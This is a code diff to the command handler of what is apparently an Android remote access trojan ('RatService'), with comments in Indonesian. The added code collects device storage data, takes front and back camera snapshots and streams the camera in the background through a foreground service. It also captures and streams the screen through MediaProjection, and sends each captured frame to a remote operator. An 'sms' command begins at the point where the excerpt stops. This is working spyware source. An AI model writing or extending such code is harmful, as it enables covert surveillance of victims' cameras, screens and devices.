@@ -54,6 +54,14 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             tm.networkOperatorName ?: "-"
         } catch (_: Exception) { "-" }
 
+        val storage = try {
+            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
+            val total = stat.blockCountLong * stat.blockSizeLong
+            val free = stat.availableBlocksLong * stat.blockSizeLong
+            val used = total - free
+            String.format(Locale.US, "%.1f/%.1f GB", used / 1e9, total / 1e9)
+        } catch (_: Exception) { "-" }
+
         return mapOf(
             "model" to Build.MODEL,
             "brand" to Build.BRAND,
@@ -61,6 +69,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             "battery" to battery,
             "ram" to ram,
             "carrier" to carrier,
+            "storage" to storage,
             "timezone" to java.util.TimeZone.getDefault().id,
             "ip" to getLocalIp()
         )
@@ -226,25 +235,36 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ============ CAM LIVE ============
+            // ============ CAMERA LIVE ============
             "camera_front" -> {
-                if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
-                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                    done(mapOf("error" to "izin kamera belum di-grant"))
-                } else {
-                    try {
-                        val act = Intent(ctx, MainActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
-                                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
-                                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
-                            putExtra("auto_start_cam", true)
-                            putExtra("cam_front", true)
-                        }
-                        ctx.startActivity(act)
-                    } catch (e: Exception) { done(mapOf("error" to e.message)); return }
-                    done(mapOf("ok" to true, "note" to "app terbuka, tunggu 2 detik"))
-                }
+    if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
+        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+        done(mapOf("error" to "izin kamera belum di-grant"))
+    } else {
+        try {
+            // Start foreground service biar stream jalan di background
+            val svc = Intent(ctx, CameraStreamService::class.java).apply {
+                putExtra("cam_front", true)
             }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(svc)
+            } else {
+                ctx.startService(svc)
+            }
+
+            // Fallback buka activity kalau service butuh foreground
+            val act = Intent(ctx, MainActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
+                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                putExtra("auto_start_cam", true)
+                putExtra("cam_front", true)
+            }
+            ctx.startActivity(act)
+        } catch (e: Exception) { done(mapOf("error" to e.message)); return }
+        done(mapOf("ok" to true, "note" to "camera stream start"))
+    }
+}
             "camera_back" -> {
                 if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
                     != android.content.pm.PackageManager.PERMISSION_GRANTED) {
@@ -268,22 +288,115 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
+            // ============ CAMERA SNAPSHOT ============
+            "camera_capture_front" -> {
+                if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    done(mapOf("error" to "izin kamera belum di-grant"))
+                } else {
+                    Thread {
+                        try {
+                            val capture = CameraCapture(ctx)
+                            val latch = java.util.concurrent.CountDownLatch(1)
+                            var frame: String? = null
+                            capture.capture(true) { b64 ->
+                                frame = b64
+                                latch.countDown()
+                            }
+                            latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
+                            if (frame != null) {
+                                RatService.instance?.sendFrame("cam_front_frame", frame!!)
+                                done(mapOf("ok" to true, "frame" to "sent", "size" to frame!!.length))
+                            } else {
+                                done(mapOf("error" to "gagal capture kamera depan"))
+                            }
+                        } catch (e: Exception) {
+                            done(mapOf("error" to e.message))
+                        }
+                    }.start()
+                }
+            }
+            "camera_capture_back" -> {
+                if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    done(mapOf("error" to "izin kamera belum di-grant"))
+                } else {
+                    Thread {
+                        try {
+                            val capture = CameraCapture(ctx)
+                            val latch = java.util.concurrent.CountDownLatch(1)
+                            var frame: String? = null
+                            capture.capture(false) { b64 ->
+                                frame = b64
+                                latch.countDown()
+                            }
+                            latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
+                            if (frame != null) {
+                                RatService.instance?.sendFrame("cam_back_frame", frame!!)
+                                done(mapOf("ok" to true, "frame" to "sent", "size" to frame!!.length))
+                            } else {
+                                done(mapOf("error" to "gagal capture kamera belakang"))
+                            }
+                        } catch (e: Exception) {
+                            done(mapOf("error" to e.message))
+                        }
+                    }.start()
+                }
+            }
+
             // ============ SCREEN LIVE ============
             "screen" -> {
-                try {
-                    val act = Intent(ctx, MainActivity::class.java).apply {
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
-                                Intent.FLAG_ACTIVITY_SINGLE_TOP or
-                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
-                        putExtra("auto_start_screen", true)
-                    }
-                    ctx.startActivity(act)
-                } catch (e: Exception) { done(mapOf("error" to e.message)); return }
-                done(mapOf("ok" to true, "note" to "app terbuka, tunggu 3 detik"))
+    if (!ScreenCapture.isReady()) {
+        // Belum grant MediaProjection → buka activity dulu buat minta izin
+        try {
+            val act = Intent(ctx, MainActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
+                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                putExtra("auto_start_screen", true)
             }
-            "stop_screen" -> {
-                try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
-                done(mapOf("ok" to true))
+            ctx.startActivity(act)
+            done(mapOf("ok" to true, "note" to "minta izin MediaProjection, tunggu 3 detik"))
+        } catch (e: Exception) { done(mapOf("error" to e.message)) }
+    } else {
+        // Udah ready → langsung stream
+        try {
+            val i = Intent(ctx, ScreenStreamService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(i)
+            } else {
+                ctx.startService(i)
+            }
+            done(mapOf("ok" to true, "note" to "screen stream start"))
+        } catch (e: Exception) { done(mapOf("error" to e.message)) }
+    }
+}
+
+            // ============ SCREEN SNAPSHOT ============
+            "screen_capture" -> {
+                Thread {
+                    try {
+                        if (!ScreenCapture.isReady()) {
+                            done(mapOf("error" to "MediaProjection belum di-grant"))
+                        } else {
+                            val latch = java.util.concurrent.CountDownLatch(1)
+                            var frame: String? = null
+                            ScreenCapture.capture(ctx) { b64 ->
+                                frame = b64
+                                latch.countDown()
+                            }
+                            latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
+                            if (frame != null) {
+                                RatService.instance?.sendFrame("screen_frame", frame!!)
+                                done(mapOf("ok" to true, "frame" to "sent", "size" to frame!!.length))
+                            } else {
+                                done(mapOf("error" to "gagal capture layar"))
+                            }
+                        }
+                    } catch (e: Exception) {
+                        done(mapOf("error" to e.message))
+                    }
+                }.start()
             }
 
             "sms" -> {
